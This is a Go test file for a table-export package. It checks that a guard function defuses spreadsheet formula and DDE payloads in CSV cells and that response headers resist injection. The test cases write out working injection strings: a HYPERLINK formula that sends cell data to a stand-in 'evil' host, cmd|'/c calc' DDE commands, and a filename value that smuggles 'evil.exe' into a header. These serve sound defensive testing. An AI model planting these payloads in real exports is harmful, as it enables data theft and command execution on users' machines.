package table

import (
	"bytes"
	"encoding/csv"
	"mime"
	"net/http/httptest"
	"testing"

	"amadan.net/rastrillo/rastrillo/xlsx"
)

func TestGuardDefusesFormulasKeepsNumbers(t *testing.T) {
	cases := []struct {
		in, want string
	}{
		// Formula and DDE payloads: quoted so the app reads them as text.
		{`=HYPERLINK("https://evil/?"&A1,"x")`, `'=HYPERLINK("https://evil/?"&A1,"x")`},
		{`=cmd|'/c calc'!A1`, `'=cmd|'/c calc'!A1`},
		{`@SUM(A1:A9)`, `'@SUM(A1:A9)`},
		{`+cmd|'/c calc'!A1`, `'+cmd|'/c calc'!A1`},
		{`-2+3+cmd|' /c calc'!A0`, `'-2+3+cmd|' /c calc'!A0`},
		{"\t=1+1", "'\t=1+1"},
		{"\r=1+1", "'\r=1+1"},
		// Plain signed numbers are inert and must stay numeric for reports.
		{"-50", "-50"},
		{"+3.5", "+3.5"},
		{"-12.50", "-12.50"},
		{"0", "0"},
		// Ordinary values untouched.
		{"", ""},
		{"Ada Lovelace", "Ada Lovelace"},
		{"ada@example.com", "ada@example.com"}, // @ not leading
		{"Analytical Engines Ltd", "Analytical Engines Ltd"},
		// A phone starting with + is not a bare number (spaces) → quoted, which is
		// also how a spreadsheet should treat a phone: as text.
		{"+353 1 234 5678", "'+353 1 234 5678"},
	}
	for _, c := range cases {
		if got := Guard(c.in); got != c.want {
			t.Errorf("Guard(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

// The guard is wired at the shared sink — headers too, since a header
// can carry a label somebody typed — and the XLSX path, already
// formula-safe, is left untouched so its values are not corrupted.
func TestServeGuardsCSVNotXLSX(t *testing.T) {
	e := Export{
		Filename: "people",
		Header:   []string{"name", "=note"},
		Rows:     [][]string{{"Ada", `=HYPERLINK("https://evil/","x")`}},
	}

	rec := httptest.NewRecorder()
	if err := Serve(rec, CSV, e); err != nil {
		t.Fatal(err)
	}
	recs, err := csv.NewReader(bytes.NewReader(rec.Body.Bytes())).ReadAll()
	if err != nil {
		t.Fatalf("parse csv: %v", err)
	}
	if len(recs) != 2 {
		t.Fatalf("csv records = %d, want 2", len(recs))
	}
	if got := recs[0][1]; got != "'=note" {
		t.Errorf("csv header cell = %q, want it apostrophe-quoted", got)
	}
	if got := recs[1][1]; got != `'=HYPERLINK("https://evil/","x")` {
		t.Errorf("csv payload cell = %q, want it apostrophe-quoted", got)
	}

	rec = httptest.NewRecorder()
	if err := Serve(rec, XLSX, e); err != nil {
		t.Fatal(err)
	}
	rows, err := xlsx.Read(rec.Body.Bytes())
	if err != nil {
		t.Fatal(err)
	}
	if got := rows[1][1]; got != `=HYPERLINK("https://evil/","x")` {
		t.Errorf("xlsx cell = %q, want the raw value: the guard must not touch the xlsx path", got)
	}
	if got := rows[0][1]; got != "=note" {
		t.Errorf("xlsx header = %q, want the raw value", got)
	}
}

// What a browser is told: the type, and a filename that survives a
// name that is not plain ASCII. An unknown format — it is usually a
// query parameter — is CSV, and never reaches the header as typed.
func TestServeHeaders(t *testing.T) {
	cases := []struct {
		format, wantType, wantName string
	}{
		{CSV, "text/csv; charset=utf-8", "Müller orders.csv"},
		{XLSX, "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", "Müller orders.xlsx"},
		{`x"; filename="evil.exe`, "text/csv; charset=utf-8", "Müller orders.csv"},
	}
	for _, c := range cases {
		rec := httptest.NewRecorder()
		if err := Serve(rec, c.format, Export{Filename: "Müller orders", Header: []string{"a"}}); err != nil {
			t.Fatal(err)
		}
		if got := rec.Header().Get("Content-Type"); got != c.wantType {
			t.Errorf("format %q: Content-Type = %q, want %q", c.format, got, c.wantType)
		}
		disp, params, err := mime.ParseMediaType(rec.Header().Get("Content-Disposition"))
		if err != nil {
			t.Fatalf("format %q: Content-Disposition %q does not parse: %v", c.format, rec.Header().Get("Content-Disposition"), err)
		}
		if disp != "attachment" || params["filename"] != c.wantName {
			t.Errorf("format %q: disposition %q filename %q, want attachment %q", c.format, disp, params["filename"], c.wantName)
		}
	}
}

// The tab is named for the download unless the caller names it.
func TestServeSheetName(t *testing.T) {
	for _, c := range []struct{ sheet, want string }{{"", "orders"}, {"Orders", "Orders"}} {
		rec := httptest.NewRecorder()
		if err := Serve(rec, XLSX, Export{Filename: "orders", Sheet: c.sheet, Header: []string{"a"}}); err != nil {
			t.Fatal(err)
		}
		sheets, err := xlsx.ReadSheets(rec.Body.Bytes())
		if err != nil {
			t.Fatal(err)
		}
		if sheets[0].Name != c.want {
			t.Errorf("Sheet %q: tab named %q, want %q", c.sheet, sheets[0].Name, c.want)
		}
	}
}

// CSV rows come out in order, one record each, the header first.
func TestServeCSVShape(t *testing.T) {
	rec := httptest.NewRecorder()
	if err := Serve(rec, CSV, Export{Filename: "t", Header: []string{"a", "b"}, Rows: [][]string{{"1", "x,y"}, {"2", ""}}}); err != nil {
		t.Fatal(err)
	}
	if got, want := rec.Body.String(), "a,b\n1,\"x,y\"\n2,\n"; got != want {
		t.Fatalf("csv = %q, want %q", got, want)
	}
}
